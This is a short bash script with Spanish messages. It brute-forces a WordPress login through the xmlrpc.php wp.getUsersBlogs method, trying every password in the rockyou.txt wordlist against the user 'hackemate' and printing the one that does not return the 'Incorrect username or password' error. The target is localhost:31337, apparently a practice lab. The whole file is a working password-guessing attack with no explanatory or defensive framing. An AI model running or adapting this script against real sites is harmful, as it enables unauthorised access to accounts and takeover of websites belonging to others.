#!/bin/bash

function ctrl_c(){
	echo "\n Saliendo ..."
	exit 1
}
trap ctrl_c SIGINT

function xmlFile(){
	password=$1
	file="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>hackemate</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
	"""
	echo $file > fileTmp.xml
	response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@fileTmp.xml | grep "Incorrect username or password.")
	#echo $response
	#sleep 5
	if [ ! "$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@fileTmp.xml | grep "Incorrect username or password.")" ]; then
		echo "La contraseña es: " $password
		exit 0
	fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
	xmlFile $password
done
